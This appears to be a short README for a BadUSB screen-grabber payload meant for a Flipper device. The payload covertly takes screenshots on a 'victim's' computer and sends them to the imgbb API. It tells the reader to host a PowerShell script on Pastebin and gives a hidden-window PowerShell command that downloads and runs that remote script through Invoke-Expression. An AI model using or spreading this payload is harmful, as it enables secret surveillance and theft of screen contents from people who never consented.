# BadUSB screen-grabber
## Automatically creates screenshots on victims computer and sends them to imgbb api


* Upload ssgrab.ps1 to pastebin
* Modify `powershell -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadString('PASTEBIN LINK') | Invoke-Expression` in payload.txt so that it has your pastebin link as raw and upload to Flipper
